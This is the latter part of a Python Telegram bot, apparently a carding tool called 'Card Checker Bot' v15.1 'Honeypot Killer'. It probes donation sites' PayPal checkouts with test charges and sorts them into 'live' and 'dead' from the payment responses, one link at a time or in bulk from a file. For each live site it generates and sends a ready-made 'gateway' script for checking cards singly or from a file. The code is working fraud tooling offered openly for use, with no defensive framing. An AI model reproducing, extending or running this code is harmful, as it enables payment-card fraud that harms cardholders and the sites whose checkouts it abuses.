        print("Saved:", out)
    except Exception as e:
        print(f"Error: {{e}}")


def main():
    print("=" * 60)
    print(f"  Live Gateway v15.1 — {{PREFERRED_AMT}} {{CURRENCY}}")
    print(f"  Auth   : {{AUTH_METHOD}}")
    print(f"  Form   : {{ID_FORM2}} ({{ID_FORM1}})")
    print(f"  Token  : {{'YES' if ACCESS_TOKEN else 'NONE'}}")
    print(f"  Fields : {{len(FORM_FIELDS)}}")
    print("=" * 60)
    while True:
        try:
            print("\\n[1] Single  [2] File  [0] Exit")
            c = input("Choose: ").strip()
            if c == '1': single_check()
            elif c == '2': file_check()
            elif c == '0': break
        except KeyboardInterrupt: break
        except: continue


if __name__ == '__main__':
    try:
        main()
    except: pass
'''


# ============================================================
#  BOT HANDLERS
# ============================================================
@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/paypal'))
def ali_al2(massege):
    try:
        save_user(massege.from_user.id)
        if is_blocked(massege.from_user.id):
            safe_send_message(massege.chat.id, 'The admin has blocked you.')
            return
        chat_id = massege.chat.id
        ko = safe_send_message(chat_id, "- The gate is being withdrawn ...")
        if not ko: return
        time.sleep(1)

        try:
            parts = massege.text.split(maxsplit=1)
            if len(parts) != 2:
                safe_edit_message(chat_id, ko.message_id,
                    '- Please send the link like this:\n\n<code>/paypal https://xxxxxxx.xxx/xxxx</code>')
                return
            link = parts[1].strip()
            link = safe_url(link)
            if not link:
                safe_edit_message(chat_id, ko.message_id, "Invalid link format ❌")
                return
            time.sleep(1)
            safe_edit_message(chat_id, ko.message_id, "Gate found ✅")
        except: pass

        try:
            tester = PayPalTester(link)
            tester.Key()
            result = tester.Charge(TEST_CARD)
            print(f"[paypal] result: {result} | amount: {tester.donation} | auth: {tester.auth_method} | fields: {len(tester.form_fields)}")

            if not is_live_response(result):
                safe_edit_message(chat_id, ko.message_id,
                    f"❌ <b>Not Live</b>\n🔗 <code>{link[:100]}</code>\n\n"
                    f"📝 <b>Response:</b> <code>{str(result)[:100]}</code>\n"
                    f"🔐 <b>Auth:</b> <code>{tester.auth_method}</code>")
                return

            try:
                code = generate_gateway_code(result, link, tester.donation, tester)
            except Exception as e:
                safe_edit_message(chat_id, ko.message_id, f"❌ Code gen error: {str(e)[:200]}")
                return

            file_name = f'gateway_{int(time.time())}.py'
            try:
                with open(file_name, "w", encoding="utf-8") as f:
                    f.write(code)
            except Exception as e:
                safe_edit_message(chat_id, ko.message_id, f"❌ File write error: {str(e)[:200]}")
                return

            display = str(result)[:100]
            if 'paypal orders are captured' in display.lower():
                display = "PayPal orders are captured"
            elif 'There was an issue with your donation' in display:
                display = "There was an issue with your donation transaction: Your card was declined."
            elif 'Your card was declined' in display or 'card was declined' in display.lower():
                display = "Your card was declined."
            elif 'ORDER_NOT_APPROVED' in display.upper() or 'PAYER_CANNOT_PAY' in display.upper():
                display = "Payer cannot pay for this transaction."

            caption = f'''✅ <b>Live Gateway Found!</b>
━━━━━━━━━━━━━━━━━━━━
🔗 <code>{link[:100]}</code>
━━━━━━━━━━━━━━━━━━━━
💬 <b>Response:</b> <code>{display}</code>
💰 <b>Amount:</b> <code>${tester.donation}</code>
💱 <b>Currency:</b> <code>{tester.currency}</code>
🔐 <b>Auth:</b> <code>{tester.auth_method}</code>
📋 <b>Fields:</b> <code>{len(tester.form_fields)}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30'''

            sent = safe_send_document(chat_id, file_name, caption=caption)
            if not sent:
                safe_send_message(chat_id,
                    f"⚠️ File could not be sent:\n\n{caption}\n\n📁 Size: {len(code)} bytes")

            try: os.remove(file_name)
            except: pass
        except Exception as e:
            traceback.print_exc()
            safe_edit_message(chat_id, ko.message_id, f"❌ Error: {str(e)[:200]}")
    except: pass


@bot.message_handler(commands=['mass'])
def mass_extract_start(message):
    try:
        save_user(message.from_user.id)
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, 'The admin has blocked you.')
            return
        user_id = message.from_user.id
        if mass_active.get(user_id, False):
            safe_send_message(message.chat.id, "⚠️ Job already running. Use /stop first.")
            return
        msg = safe_send_message(message.chat.id, 
            "📁 Send a .txt file with links (one per line)\n"
            "♻️ Or /resume to continue last job")
        if msg:
            bot.register_next_step_handler(msg, process_mass_file)
    except: pass


@bot.message_handler(commands=['resume'])
def mass_resume(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        progress = load_progress(user_id)
        if not progress:
            safe_send_message(chat_id, "❌ No saved progress.")
            return
        total = progress.get('total', 0)
        processed = progress.get('processed', 0)
        if processed >= total:
            safe_send_message(chat_id, f"✅ Job complete ({processed}/{total})")
            clear_progress(user_id)
            return
        links = progress.get('links', [])
        mass_pause[user_id] = False
        safe_send_message(chat_id, f"♻️ Resuming from {processed}/{total}...")
        threading.Thread(
            target=_run_mass_job,
            args=(chat_id, user_id, links, processed, progress),
            daemon=True
        ).start()
    except: pass


@bot.message_handler(commands=['stop'])
def stop_mass(message):
    try:
        user_id = message.from_user.id
        if mass_active.get(user_id, False):
            mass_pause[user_id] = True
            safe_send_message(message.chat.id, "🛑 Stopping (saving progress)...")
        else:
            safe_send_message(message.chat.id, "❌ No active process.")
    except: pass


def process_mass_file(message):
    try:
        if not message.document:
            safe_send_message(message.chat.id, "❌ Please send a .txt file.")
            return

        user_id = message.from_user.id
        chat_id = message.chat.id

        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        links_raw = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        
        links = []
        for l in links_raw:
            l = l.strip()
            if not l: continue
            safe = safe_url(l)
            if safe: links.append(safe)

        if not links:
            safe_send_message(chat_id, "❌ File is empty or invalid URLs.")
            return

        total = len(links)
        progress = {
            'total': total,
            'processed': 0,
            'live': 0,
            'dead': 0,
            'links': links,
            'started_at': time.time(),
        }
        save_progress(user_id, progress)

        safe_send_message(chat_id,
            f"✅ Loaded: <b>{total}</b> valid links\n"
            f"🚀 Starting scan...\n"
            f"🛑 /stop to stop\n"
            f"♻️ /resume if crashed")

        threading.Thread(
            target=_run_mass_job,
            args=(chat_id, user_id, links, 0, progress),
            daemon=True
        ).start()

    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Error: {str(e)[:100]}")


def _run_mass_job(chat_id, user_id, links, start_idx, progress):
    total = len(links)
    processed = start_idx
    live = progress.get('live', 0)
    dead = progress.get('dead', 0)
    started_at = progress.get('started_at', time.time())

    mass_active[user_id] = True
    mass_pause[user_id] = False

    counters = {'processed': processed, 'live': live, 'dead': dead}
    lock = threading.Lock()

    results_file = f'results_{user_id}_{int(started_at)}.txt'
    live_dir = f'live_{user_id}_{int(started_at)}'
    try: os.makedirs(live_dir, exist_ok=True)
    except: pass

    status_msg = safe_send_message(chat_id,
        f"📊 <b>Mass Scan Started</b>\n📌 Total: {total}\n⏳ Starting...")

    last_link = [""]
    last_response = [""]
    last_live = [False]
    live_counter = [live]
    current_state = {"status": "starting"}

    def status_updater():
        while mass_active.get(user_id, False):
            try:
                if not status_msg:
                    time.sleep(1.5)
                    continue
                with lock:
                    p = counters['processed']
                    l = counters['live']
                    d = counters['dead']
                pct = int((p / total) * 100) if total > 0 else 0
                elapsed = time.time() - started_at
                spd = p / elapsed if elapsed > 0 else 0
                eta = (total - p) / spd if spd > 0 else 0
                bar_len = 20
                filled = int((pct / 100) * bar_len)
                bar = '█' * filled + '░' * (bar_len - filled)
                if last_link[0]:
                    link_display = last_link[0][:65]
                    resp_display = last_response[0][:65]
                    live_icon = "✅" if last_live[0] else "❌"
                    last_section = f"{live_icon} <b>Last Checked:</b>\n<code>{link_display}</code>\n💬 <b>Response:</b>\n<code>{resp_display}</code>"
                else:
                    last_section = "⏳ Waiting for first result..."
                if current_state["status"] == "checking":
                    checking_section = "🔄 <i>Checking next link...</i>"
                else:
                    checking_section = "⏸️ <i>Moving to next...</i>"
                text = f"""📊 <b>Mass Scan</b>
━━━━━━━━━━━━━━━━━━
📌 Total: {total}
✅ Live: {l}
❌ Dead: {d}
⏳ {pct}% {bar}
━━━━━━━━━━━━━━━━━━
{last_section}
━━━━━━━━━━━━━━━━━━
{checking_section}
⚡ Speed: {spd:.1f}/s | ETA: {int(eta/60)}m {int(eta%60)}s
🛑 /stop | ♻️ /resume"""
                safe_edit_message(chat_id, status_msg.message_id, text)
            except: pass
            time.sleep(1.5)

    threading.Thread(target=status_updater, daemon=True).start()

    try:
        for idx in range(start_idx, total):
            if mass_pause.get(user_id, False):
                with lock:
                    progress['processed'] = counters['processed']
                    progress['live'] = counters['live']
                    progress['dead'] = counters['dead']
                save_progress(user_id, progress)
                safe_send_message(chat_id,
                    f"🛑 <b>Stopped</b>\n📌 {counters['processed']}/{total}\n♻️ /resume to continue")
                break

            link = links[idx]
            current_state["status"] = "checking"

            try:
                result = check_single_link(link)
            except Exception as e:
                result = {'link': str(link)[:100], 'live': False, 'respons': f'Error: {str(e)[:50]}', 'tester': None}

            with lock:
                counters['processed'] += 1
                cur_processed = counters['processed']

            resp_text = str(result.get('respons', 'Unknown'))[:100]
            is_live = result.get('live', False)
            
            if 'paypal orders are captured' in resp_text.lower():
                resp_text = "PayPal orders are captured"
            elif 'There was an issue with your donation' in resp_text:
                resp_text = "There was an issue with your donation transaction: Your card was declined."
            elif 'Your card was declined' in resp_text or 'card was declined' in resp_text.lower():
                resp_text = "Your card was declined."
            elif 'ORDER_NOT_APPROVED' in resp_text.upper() or 'PAYER_CANNOT_PAY' in resp_text.upper():
                resp_text = "Payer cannot pay for this transaction."

            last_link[0] = link
            last_response[0] = resp_text
            last_live[0] = is_live

            try:
                with open(results_file, 'a', encoding='utf-8') as f:
                    f.write(f"{link} => {result.get('respons', 'unknown')}\n")
            except: pass

            if is_live:
                with lock:
                    counters['live'] += 1
                    live_counter[0] += 1
                try:
                    tester = result.get('tester')
                    code = generate_gateway_code(
                        result['respons'], result['link'],
                        result.get('amount', '1.00'), tester
                    )
                    gateway_path = os.path.join(live_dir, f'gateway_{live_counter[0]}.py')
                    with open(gateway_path, 'w', encoding='utf-8') as f:
                        f.write(code)
                    cur = tester.currency if tester else 'USD'
                    auth = tester.auth_method if tester else 'none'
                    caption = f"""✅ <b>Live #{live_counter[0]}</b>
🔗 <code>{result['link'][:80]}</code>
💬 {resp_text[:80]}
💰 ${result.get('amount', '1.00')} | 💱 {cur} | 🔐 {auth}"""
                    safe_send_document(chat_id, gateway_path, caption=caption)
                    try: os.remove(gateway_path)
                    except: pass
                except Exception as e:
                    print(f"[live] {e}")
            else:
                with lock:
                    counters['dead'] += 1

            if counters['processed'] % 50 == 0:
                with lock:
                    progress['processed'] = counters['processed']
                    progress['live'] = counters['live']
                    progress['dead'] = counters['dead']
                save_progress(user_id, progress)

            current_state["status"] = "moving"
            time.sleep(0.1)

        mass_active[user_id] = False
        time.sleep(2)

        if not mass_pause.get(user_id, False):
            with lock:
                progress['processed'] = counters['processed']
                progress['live'] = counters['live']
                progress['dead'] = counters['dead']
            save_progress(user_id, progress)
            rate = int((counters['live'] / total) * 100) if total > 0 else 0
            final = f"""📊 <b>✅ COMPLETE!</b>
━━━━━━━━━━━━━━━━━━
📌 Total: {total}
✅ Live: {counters['live']}
❌ Dead: {counters['dead']}
💯 Rate: {rate}%
📁 Results: <code>{results_file}</code>
━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30"""
            if status_msg:
                safe_edit_message(chat_id, status_msg.message_id, final)
            else:
                safe_send_message(chat_id, final)
            clear_progress(user_id)

    except Exception as e:
        traceback.print_exc()
        mass_active[user_id] = False
        with lock:
            progress['processed'] = counters['processed']
            progress['live'] = counters['live']
            progress['dead'] = counters['dead']
        save_progress(user_id, progress)
        safe_send_message(chat_id,
            f"⚠️ <b>Crashed at {counters['processed']}/{total}</b>\n"
            f"♻️ /resume to continue\n"
            f"Error: {str(e)[:100]}")


# ============================================================
#  START / FEEDBACK / ADMIN
# ============================================================
@bot.message_handler(commands=["start"])
def start(message):
    try:
        save_user(message.from_user.id)
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, 'The admin has blocked you.')
            return
        user_id = message.from_user.id
        userr = message.from_user.first_name
        username = message.from_user.username or "No Username"
        IU = f'''[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟
[⚡] 𝐍𝐚𝐦𝐞: {userr}
[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}
[⚡] 𝐈𝐃: <code>{user_id}</code>
- - - - - - - - - - - - - - - - - - - - - -
[⚡] PayPal Gateway >> /paypal
[⚡] Mass Extract >> /mass
[⚡] Resume Job >> /resume
[⚡] Send Feedback >> Button Below
- - - - - - - - - - - - - - - - - - - - - -
[⚡] 𝐁𝐨𝐭 𝐁𝐲: @FAWZY30
[⚡] 𝐃𝐞𝐯 𝐁𝐲: Wafa.'''
        FRA = types.InlineKeyboardMarkup(row_width=2)
        FRA.add(types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr'))
        safe_send_message(message.chat.id, IU, reply_markup=FRA)
    except: pass


@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def feedback(call):
    try:
        user_id = call.from_user.id
        userr = call.from_user.first_name
        Atty = types.InlineKeyboardMarkup(row_width=1)
        Atty.add(types.InlineKeyboardButton("Back", callback_data="start"))
        try:
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=f'Welcome {userr} Send your message.', parse_mode='HTML', reply_markup=Atty)
        except Exception as e:
            print(f"Feedback error: {e}")
        waiting_users[user_id] = True
    except: pass


@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def get_user_msg(message):
    try:
        user_id = message.from_user.id
        name = message.from_user.first_name
        text = message.text or "(non-text message)"
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{user_id}"))
        safe_send_message(OWNER_ID, f"New Message\n\nFrom: {name}\nID: {user_id}\nMessage: {text}", reply_markup=kb)
        kb2 = types.InlineKeyboardMarkup()
        kb2.add(types.InlineKeyboardButton("Send another message", callback_data="yrr"))
        safe_send_message(user_id, "Your message has been sent.", reply_markup=kb2)
        waiting_users.pop(user_id, None)
    except: pass


@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def start_reply(call):
    try:
        user_id = int(call.data.split("_")[1])
        reply_mode[call.from_user.id] = user_id
        safe_send_message(call.from_user.id, "Write your reply now:")
    except: pass


@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def send_reply(message):
    try:
        user_id = reply_mode[message.from_user.id]
        text = message.text or "(non-text message)"
        safe_send_message(user_id, f"Admin response:\n\n{text}")
        safe_send_message(OWNER_ID, "Reply sent.")
        reply_mode.pop(message.from_user.id, None)
    except: pass


@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    try:
        user_id = call.from_user.id
        userr = call.from_user.first_name
        username = call.from_user.username or "No Username"
        IU = f'[⚡] Welcome {userr}\n[⚡] @{username}\n[⚡] ID: <code>{user_id}</code>'
        FRA = types.InlineKeyboardMarkup(row_width=2)
        FRA.add(types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr'))
        try:
            bot.edit_message_text(IU, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=FRA)
        except Exception as e:
            print(f"Back error: {e}")
    except: pass


@bot.message_handler(commands=['block2'])
def block_user(message):
    try:
        if str(message.from_user.id) not in admins:
            safe_send_message(message.chat.id, "You do not have permission.")
            return
        uid = message.text.split()[1].strip()
        if not uid.isdigit():
            safe_send_message(message.chat.id, "❌ User ID must be numeric.")
            return
        blocked = [l.strip() for l in open('blockusers.txt').read().splitlines() if l.strip()]
        if uid in blocked:
            safe_send_message(message.chat.id, f"⚠️ User ID {uid} is already blocked.")
            return
        open('blockusers.txt', 'a').write(f"{uid}\n")
        safe_send_message(message.chat.id, f"✅ User ID {uid} blocked.")
        try: safe_send_message(int(uid), "🚫 You have been blocked by the admin.")
        except: pass
    except:
        safe_send_message(message.chat.id, "Usage: /block2 [user_id]")


@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    try:
        if str(message.from_user.id) not in admins:
            safe_send_message(message.chat.id, "You do not have permission.")
            return
        uid = message.text.split()[1].strip()
        if not uid.isdigit():
            safe_send_message(message.chat.id, "❌ User ID must be numeric.")
            return
        lines = open('blockusers.txt').readlines()
        found = any(l.strip() == uid for l in lines)
        if not found:
            safe_send_message(message.chat.id, f"⚠️ User ID {uid} is not blocked.")
            return
        with open('blockusers.txt', 'w') as f:
            for l in lines:
                if l.strip() != uid: f.write(l)
        safe_send_message(message.chat.id, f"✅ User ID {uid} unblocked.")
        try: safe_send_message(int(uid), "✅ You have been unblocked by the admin.")
        except: pass
    except:
        safe_send_message(message.chat.id, "Usage: /unblock2 [user_id]")


@bot.message_handler(commands=['blocklist'])
def block_list(message):
    try:
        if str(message.from_user.id) not in admins:
            safe_send_message(message.chat.id, "You do not have permission.")
            return
        blocked = [l.strip() for l in open('blockusers.txt').read().splitlines() if l.strip()]
        if not blocked:
            safe_send_message(message.chat.id, "📋 Block list is empty.")
            return
        text = "📋 <b>Blocked Users:</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        for i, uid in enumerate(blocked, 1):
            text += f"{i}. <code>{uid}</code>\n"
        text += f"━━━━━━━━━━━━━━━━━━━━\n📌 Total: <b>{len(blocked)}</b>"
        safe_send_message(message.chat.id, text)
    except: pass


print('✅ Bot v15.1 Honeypot Killer is running...')
try:
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
except Exception as e:
    print(f'❌ Error: {e}')
